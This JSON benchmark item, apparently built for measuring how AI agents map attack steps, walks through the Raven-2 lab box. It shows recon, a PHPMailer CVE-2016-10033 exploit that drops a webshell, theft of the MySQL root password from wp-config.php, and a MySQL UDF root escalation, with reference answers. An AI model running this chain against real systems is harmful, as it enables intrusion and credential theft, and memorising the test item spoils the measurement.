@@ -1,0 +1,137 @@
+{
+  "box": "Raven-2",
+  "source": "Representative walkthrough constructed from public Raven-2 write-up structure (PHPMailer CVE-2016-10033 RCE via contact form -> www-data webshell -> MySQL UDF root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "chained_exploit",
+  "vulnhub_correspondence": "WordPress site bundles vulnerable PHPMailer 5.2.16 under /vendor; contact.php Return-Path injection (CVE-2016-10033) drops a webshell as www-data; MySQL runs as root and the raptor UDF library escalates to root.",
+  "target_label": "http://10.10.10.5",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target with nmap to enumerate open services and versions.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 6.7p1 Debian\n80/tcp   open  http    Apache httpd 2.4.10 ((Debian))\n111/tcp  open  rpcbind\n3306/tcp open  mysql   MySQL 5.5.60",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80"], "tech_stack": ["apache", "mysql"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web technology stack.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5/",
+      "tool_output": "http://10.10.10.5/ [200 OK] Apache[2.4.10], PHP[5.6.40], MetaGenerator[WordPress 4.8.7], PoweredBy[WordPress], WordPress[4.8.7]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "php", "wordpress"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate web directories to find the application and bundled components.",
+      "tool": "gobuster",
+      "tool_command": "gobuster dir -u http://10.10.10.5/ -w common.txt",
+      "tool_output": "/wordpress            (Status: 301)\n/vendor               (Status: 301)\n/contact.php          (Status: 200)\n/wp-login.php         (Status: 200)",
+      "reference_abstract_action": "web_path_enumeration",
+      "reference_state_after": {"discovered_paths": ["/wordpress", "/vendor", "/contact.php", "/wp-login.php"]}
+    },
+    {
+      "step": 3,
+      "phase": "vuln-id",
+      "actor_intent": "Read the bundled PHPMailer version file to confirm it is vulnerable to CVE-2016-10033.",
+      "tool": "curl",
+      "tool_command": "curl -s http://10.10.10.5/vendor/VERSION",
+      "tool_output": "5.2.16",
+      "reference_abstract_action": "vulnerability_check",
+      "vuln_id": "phpmailer_rce",
+      "reference_state_after": {}
+    },
+    {
+      "step": 4,
+      "phase": "exploit",
+      "actor_intent": "Exploit the PHPMailer Return-Path injection through contact.php to drop a webshell.",
+      "tool": "exploit",
+      "tool_command": "python phpmailer_exploit.py http://10.10.10.5/contact.php",
+      "tool_output": "[*] Target PHPMailer 5.2.16 is vulnerable to CVE-2016-10033\n[+] injecting payload into Return-Path\n[+] backdoor written to /backdoor.php\ncommand execution confirmed",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "phpmailer_rce",
+      "yields_shell": true,
+      "reference_state_after": {"verified_vulnerabilities": ["phpmailer_rce"], "shell_state": "webshell"}
+    },
+    {
+      "step": 5,
+      "phase": "post-exploit",
+      "actor_intent": "Run id through the backdoor to confirm execution as the web user.",
+      "tool": "command",
+      "tool_command": "curl 'http://10.10.10.5/backdoor.php?cmd=id'",
+      "tool_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "web_user"},
+      "candidate_pool": [
+        "Run id through the backdoor to confirm execution as the web user.",
+        "Re-run the PHPMailer exploit that already succeeded.",
+        "Enumerate web directories again for more paths.",
+        "Immediately read the root flag with no root access."
+      ]
+    },
+    {
+      "step": 6,
+      "phase": "loot",
+      "actor_intent": "Read the second flag found in the web root.",
+      "tool": "fileread",
+      "tool_command": "cat /var/www/flag2.txt",
+      "tool_output": "flag2{ebcb3f1b5152b8e2b91c0a9e0c0e6e7d}",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "flag2",
+      "reference_state_after": {"read_files": ["flag2"]}
+    },
+    {
+      "step": 7,
+      "phase": "loot",
+      "actor_intent": "Read the WordPress config to recover the MySQL root password.",
+      "tool": "fileread",
+      "tool_command": "cat /var/www/html/wordpress/wp-config.php",
+      "tool_output": "define('DB_USER', 'root');\ndefine('DB_PASSWORD', 'R@v3nSecurity');\ndefine('DB_HOST', 'localhost');",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "wp_config",
+      "reference_state_after": {"read_files": ["wp_config"]}
+    },
+    {
+      "step": 8,
+      "phase": "privesc-recon",
+      "actor_intent": "Confirm MySQL is running as root so its UDF can be abused for escalation.",
+      "tool": "command",
+      "tool_command": "ps aux | grep mysql",
+      "tool_output": "root      1337  0.4  9.8 /usr/sbin/mysqld --basedir=/usr",
+      "reference_abstract_action": "post_exploitation",
+      "reference_state_after": {}
+    },
+    {
+      "step": 9,
+      "phase": "privesc",
+      "actor_intent": "Escalate to root by loading a malicious MySQL UDF (raptor) that runs do_system.",
+      "tool": "privesc",
+      "tool_command": "mysql -u root -p'R@v3nSecurity' < raptor_udf.sql; then trigger do_system",
+      "tool_output": "mysql> select do_system('chmod +s /bin/bash');\n# /bin/bash -p\n# id\nuid=0(root) gid=0(root)\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"},
+      "candidate_pool": [
+        "Escalate to root by loading a malicious MySQL UDF that runs do_system.",
+        "Read the root flag before having root.",
+        "Re-run the contact-form exploit."
+      ]
+    },
+    {
+      "step": 10,
+      "phase": "loot",
+      "actor_intent": "Read the final root flag.",
+      "tool": "fileread",
+      "tool_command": "cat /root/flag4.txt",
+      "tool_output": "flag4{715dea6c055b9fe3337544932f2941ce}",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "flag4",
+      "reference_state_after": {"read_files": ["flag4"]}
+    }
+  ]
+}
